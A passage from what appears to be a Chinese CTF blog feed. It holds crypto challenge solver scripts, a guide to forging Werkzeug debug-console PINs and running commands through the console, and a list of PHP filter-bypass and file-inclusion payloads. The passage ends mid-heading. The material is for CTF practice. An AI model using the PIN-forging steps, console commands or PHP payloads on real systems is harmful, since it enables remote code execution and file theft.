<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1, n1, a2, n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">global</span> mod</span><br><span class="line">    mod = n1</span><br><span class="line">    <span class="keyword">return</span> (a1 % n1 + n1) % n1</span><br><span class="line"></span><br><span class="line">ms = [</span><br><span class="line">    <span class="number">207867980504656835313307696396607264603</span>,</span><br><span class="line">    <span class="number">245036212212570610987366430554968489325</span>,</span><br><span class="line">    <span class="number">270836744824069537438646110613439698666</span>,</span><br><span class="line">    <span class="number">319275775495422875474878625752594133023</span>,</span><br><span class="line">    <span class="number">254268823435329877199449670714528712873</span>,</span><br><span class="line">    <span class="number">213093607196415232366564484229844568444</span>,</span><br><span class="line">    <span class="number">246921085368773491003187313772615702950</span>,</span><br><span class="line">]</span><br><span class="line">cs = [</span><br><span class="line">    <span class="number">150031581047390726903711035932621949276</span>,</span><br><span class="line">    <span class="number">21260202376534810598778595491323328519</span>,</span><br><span class="line">    <span class="number">144049733622518360270048059408969512643</span>,</span><br><span class="line">    <span class="number">236920143187836025924037873968303507493</span>,</span><br><span class="line">    <span class="number">99781504248790469459151935530031893836</span>,</span><br><span class="line">    <span class="number">69236016568483424294966410179787943383</span>,</span><br><span class="line">    <span class="number">20613188366058016717435734248097940419</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">x = exCRT(cs, ms)</span><br><span class="line">flag = hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;6a651&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">    x = x + mod</span><br><span class="line">    <span class="comment"># print(x)</span></span><br><span class="line">    flag = hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(type(flag))</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ecc">ecc</h2><p><a href="https://dexterjie.github.io/2023/07/25/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/ECC/">https://dexterjie.github.io/2023/07/25/非对称加密/ECC/</a></p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line">a = <span class="number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line">b = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line">k = <span class="number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E([<span class="number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span> , <span class="number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span>])</span><br><span class="line">c2 = E([<span class="number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span> , <span class="number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span>])</span><br><span class="line">cipher_left = <span class="number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line">cipher_right = <span class="number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = c1 - k * c2</span><br><span class="line"></span><br><span class="line">flag1 = cipher_left//m[<span class="number">0</span>]</span><br><span class="line">flag2 = cipher_right//m[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag1,flag2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag1))+long_to_bytes(<span class="built_in">int</span>(flag2)))</span><br></pre></td></tr></table></figure><h2 id="dp">dp</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line">n = <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65537</span>):</span><br><span class="line">    p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="inPEM（复现）">inPEM（复现）</h2><p>给了公钥和私钥的部分，直接手撕，注意删掉私钥第一个w</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;key.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="comment"># c = b64decode(c)</span></span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;public.pem&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f.read())</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;ZyyAzKowuDD1R48UelUskEv0W8AXLOHR4nni</span></span><br><span class="line"><span class="string">2uqP/7tlAPCJrMVD8zoRsRviyUnqO6y7cV7G0Fo1AoGBALpb6vOC9Ya/BEYV8+yL</span></span><br><span class="line"><span class="string">814K0KQc7LITkwqGrDWoDZAxmgWqVtoxHuhDWr5jF+ttFZBPx4fTezTEjarXXSt3</span></span><br><span class="line"><span class="string">pB1c7EwnzO0Hy9qJH++g2dcCUCO8uGXBbAACZqCQZAAydSrM5zozWAYMBWcj54j0</span></span><br><span class="line"><span class="string">LtyOEg4PWPXiTzJ//xxWaH+xAoGBAKFGRIyYD89JvlZA6oz7YnjzsnDlTq01td32</span></span><br><span class="line"><span class="string">XAuw62dZQHWmg1npC3YtzFlgTyNY2QelObmryyc2vFnxVhTYcDXFLQwrX8X5YV4A</span></span><br><span class="line"><span class="string">rFAAlyzxpNzYPzDHrdqLD6PhMU+wRuHVPyAtNBsL0N+mgQcsWJJvngSTHg86kJOl</span></span><br><span class="line"><span class="string">HlNuLBGhAoGAFiG3VR+lubcPvXOVAvkt+c8rF6qcmXlb2Og0hNwDJ2roX98aqOVy</span></span><br><span class="line"><span class="string">p5AWGPoA1siI4/RPIp1ClfEwKMjraun1ZJs/jKemaQk2hdhWkQ+6QinvUJbA1Lqm</span></span><br><span class="line"><span class="string">TcRmKa1emY/U6I8ce6N69e7ver1DV4I/ugSahJlZT/JRyF5qj1uVZ/k=&quot;&quot;&quot;</span></span><br><span class="line">tb = base64.b64decode(data)</span><br><span class="line"><span class="built_in">print</span>(tb.<span class="built_in">hex</span>())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a35</span></span><br><span class="line"><span class="string">028181</span></span><br><span class="line"><span class="string">00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1</span></span><br><span class="line"><span class="string">028181</span></span><br><span class="line"><span class="string">00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1</span></span><br><span class="line"><span class="string">028180</span></span><br><span class="line"><span class="string">1621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dp = <span class="number">0x00BA5BEAF382F586BF044615F3EC8BF35E0AD0A41CECB213930A86AC35A80D90319A05AA56DA311EE8435ABE6317EB6D15904FC787D37B34C48DAAD75D2B77A41D5CEC4C27CCED07CBDA891FEFA0D9D7025023BCB865C16C000266A090640032752ACCE73A3358060C056723E788F42EDC8E120E0F58F5E24F327FFF1C56687FB1</span></span><br><span class="line">dq = <span class="number">0x00A146448C980FCF49BE5640EA8CFB6278F3B270E54EAD35B5DDF65C0BB0EB67594075A68359E90B762DCC59604F2358D907A539B9ABCB2736BC59F15614D87035C52D0C2B5FC5F9615E00AC5000972CF1A4DCD83F30C7ADDA8B0FA3E1314FB046E1D53F202D341B0BD0DFA681072C58926F9E04931E0F3A9093A51E536E2C11A1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = libnum.gcd(<span class="built_in">pow</span>(<span class="number">6</span>, dq * e, n) - <span class="number">6</span>, n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(n == p * q)</span><br><span class="line">m = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = libnum.invmod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&quot;private1.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br><span class="line"><span class="comment"># openssl rsautl -decrypt -inkey private1.pem -in key.enc</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/img/WP/geek2024/%E6%88%90%E7%BB%A9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
我是极客大挑战2024第二名队里的web手&lt;br&gt;
关注我们队的逆向手谢谢喵 &lt;a href=&quot;http://www.czyerror.top&quot;&gt;E</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="crypto" scheme="https://blog.hatchet.top/tags/crypto/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="WP" scheme="https://blog.hatchet.top/tags/WP/"/>
    
    <category term="misc" scheme="https://blog.hatchet.top/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Python中werkzeug有关PIN值的构造</title>
    <link href="https://blog.hatchet.top/posts/fc0a87bd.html"/>
    <id>https://blog.hatchet.top/posts/fc0a87bd.html</id>
    <published>2024-10-24T10:47:31.000Z</published>
    <updated>2024-11-21T13:43:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考自<a href="https://blog.hz2016.com/2023/07/flask%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8Fpin%E5%80%BC%E8%AE%A1%E7%AE%97%E5%92%8C%E5%88%A9%E7%94%A8/">https://blog.hz2016.com/2023/07/flask调试模式pin值计算和利用/</a></p><h1 id="需要知道的文件名一览">需要知道的文件名一览</h1><h2 id="用户名">用户名</h2><p>通过/etc/passwd猜测，一般是root。如果有用户目录设在/app大概率是那个用户名</p><h2 id="源码地址">源码地址</h2><p>通过报错得到</p><h2 id="网络地址">网络地址</h2><pre><code>/sys/class/net/eth0/address/sys/class/net/ens33/address</code></pre><p>需要转十进制（后面有脚本）</p><h2 id="机器ID">机器ID</h2><pre><code>1. /etc/machine-id（一般仅非docker机有，截取全文）2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）3. /proc/self/cgroup（一般仅docker有，仅截取最后一个斜杠后面的内容）优先选择1，没有1选2，只能选1，2中的一个。3有没有不影响，有就要连接在1或2的后面。(1 or 2) (+3)</code></pre><h1 id="脚本">脚本</h1><h2 id="算地址（可以内置进下面的版本计算）">算地址（可以内置进下面的版本计算）</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">address = <span class="string">&quot;02:0a:27:03:12:57&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(address.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>))</span><br></pre></td></tr></table></figure><h2 id="低版本-werkzeug-2-0-x-md5">低版本(werkzeug&lt;2.0.x md5)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;flaskweb&quot;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.7/site-packages/flask/app.py&quot;</span>,  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;25214234362297&quot;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&quot;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&quot;</span>,  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="高版本-werkzeug-2-0-x-sha1">高版本(werkzeug&gt;=2.0.x sha1)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># machine-id：</span></span><br><span class="line"><span class="comment"># machine-id是通过**三个文件**里面的内容经过处理后拼接起来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. /etc/machine-id（一般仅非docker机有，截取全文）</span></span><br><span class="line"><span class="comment"># 2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）</span></span><br><span class="line"><span class="comment"># 3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）</span></span><br><span class="line"><span class="comment"># # 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope</span></span><br><span class="line"><span class="comment"># # 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面</span></span><br><span class="line"><span class="comment"># 文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。</span></span><br><span class="line"><span class="comment"># 文件3如果存在的话就截取，不存在的话就不用管</span></span><br><span class="line"><span class="comment"># 最后machine-id=（文件1或文件2）+文件3（存在的话）</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;root&quot;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.10/site-packages/flask/app.py&quot;</span>,  <span class="comment"># moddir，报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;2242627441239&quot;</span>,  <span class="comment"># /sys/class/net/eth0/address 十进制</span></span><br><span class="line">    <span class="comment"># 1. /etc/machine-id 2. /proc/sys/kernel/random/boot_id 3. /proc/self/cgroup (1 or 2)(+3)</span></span><br><span class="line">    <span class="string">&quot;d45a88e1-3fe4-4156-9e59-3864587b7c87&quot;</span>,  <span class="comment">#</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="注意的点（重点）">注意的点（重点）</h1><p><code>开启调试在/console</code></p><h2 id="输入参数">输入参数</h2><p>发现/console藏有源码如</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">CONSOLE_MODE</span> = <span class="literal">true</span>,</span><br><span class="line">      <span class="variable constant_">EVALEX</span> = <span class="literal">true</span>,</span><br><span class="line">      <span class="variable constant_">EVALEX_TRUSTED</span> = <span class="literal">false</span>,</span><br><span class="line">      <span class="variable constant_">SECRET</span> = <span class="string">&quot;HwSWplRMh0QHXH37xhln&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>计算好PIN值后传参</p><pre><code>/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=683-407-538&amp;s=HwSWplRMh0QHXH37xhln</code></pre><p>s的值取自源码<br>当出现 {“auth”: true, “exhausted”: false}时说明验证成功<br>获取输入PIN值后的cookie并拿到flag</p><pre><code>/console?__debugger__=yes&amp;cmd=open('/flag').read()&amp;frm=0&amp;s=HwSWplRMh0QHXH37xhlnCookie: __wzd489be12137736dc7b5b4=1729773727|f867e64c2141RCE:import os;os.popen('cat /flag').read()</code></pre><h2 id="开启调试模式，但访问路由报400">开启调试模式，但访问路由报400</h2><p>对debug console的请求需要来自信任的host<br>添加Header Host:127.0.0.1，写到原Host前后</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考自&lt;a href=&quot;https://blog.hz2016.com/2023/07/flask%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8Fpin%E5%80%BC%E8%AE%A1%E7%AE%97%E5%92%8C%E5%88%A9%E7%</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="python" scheme="https://blog.hatchet.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>PHP特性</title>
    <link href="https://blog.hatchet.top/posts/44659fec.html"/>
    <id>https://blog.hatchet.top/posts/44659fec.html</id>
    <published>2024-09-25T07:33:05.000Z</published>
    <updated>2024-11-18T05:04:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="REQUEST-循环查找参数">$_REQUEST 循环查找参数</h1><pre><code>if($_REQUEST)&#123;    foreach ($_REQUEST as $key =&gt; $value) &#123;        if(preg_match('/[a-zA-Z]/i', $value))   die('waf');    &#125;&#125;</code></pre><p>$_REQUEST 优先识别 POST 传递的参数，在传入$_GET 的参数时也传一个同名的$_POST 参数值，可以覆盖对$_REQUEST 的过滤。</p><h1 id="SERVER-‘QUERY-STRING’-检查">$_SERVER[‘QUERY_STRING’]检查</h1><pre><code>if($_SERVER)&#123;    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('w2');&#125;</code></pre><p>$_SERVER 不会对参数 url 编码，可以对过滤的字符进行 URL 编码。一个寻找可被 url 编码字符的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>)&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>)&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; &#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="特殊名称参数-改为">特殊名称参数: _改为[</h1><p><code>$_GET['ez_ser.from_you']</code> 这种同时存在_和. 的参数，传参时要把参数第一个 _ 换为 [ , 传入 <code>ez[ser.from_you</code> 即可正常传入。<br>原理：<br>php⾮法传参<br>在给参数传值时，如果参数名中存在⾮法字符，⽐如空格和点，则参数名中的点和空格等⾮法字符都会被替换成下划线。<br>并且，在PHP8之前，如果参数中出现中括号[，那么中括号会被转换成下划线_，但是会出现转换错误，导致如果参数名后⾯还存在⾮法字符，则不会继续转换成下划线。<br>也就是说，我们可以刻意拼接中括号制造这种错误，来保留后⾯的⾮法字符不被替换，因为中括号导致只会替换⼀次。</p><h1 id="哈希函数相关">哈希函数相关</h1><p><a href="https://blog.hatchet.top/posts/66a71aff">常见的哈希函数绕过</a></p><h1 id="file-get-contents-GET-‘flag’-绕过">file_get_contents($_GET[‘flag’])绕过</h1><h2 id="要求-file-get-contents-GET-‘flag’-flag’为真">要求 file_get_contents($_GET[‘flag’])=='flag’为真</h2><h2 id="data-text">data://text</h2><ol><li>flag=data://text/plain,flag</li><li>flag=data://text/plain;base64,ZmxhZw==</li></ol><h2 id="php-input">php://input</h2><pre><code>GET 传参:flag=php://inputPOST 传参:flag</code></pre><h2 id="限制-GET-‘flag’-以-http-开头且-strpos-file-get-contents-GET-‘flag’-‘content’-true">限制$_GET[‘flag’]以 http 开头且 strpos(file_get_contents($_GET[‘flag’]), ‘content’)===true</h2><p>flag=<a href="http://example.com@127.0.0.1">http://example.com@127.0.0.1</a><br>或者搭建 vps 将@后替换为自己的域名</p><h1 id="文件包含">文件包含</h1><h2 id="include-require-等-php-filter">include, require 等 -&gt; php://filter</h2><h3 id="常规读取">常规读取</h3><pre><code>?file=php://filter/convert.base64-encode/resource=传马?file=data://text/plain,&lt;?php phpinfo();?&gt;</code></pre><h3 id="过滤了-base64">过滤了 base64</h3><pre><code>?file=php://filter//convert.iconv.UCS-4*.UCS-4*/resource=?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=?file=php://filter/read=convert.quoted-printable-encode/resource=</code></pre><p>可用的 filter 编码名单</p><pre><code>UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*</code></pre><h2 id="绕过-require-once-命令">绕过 require_once 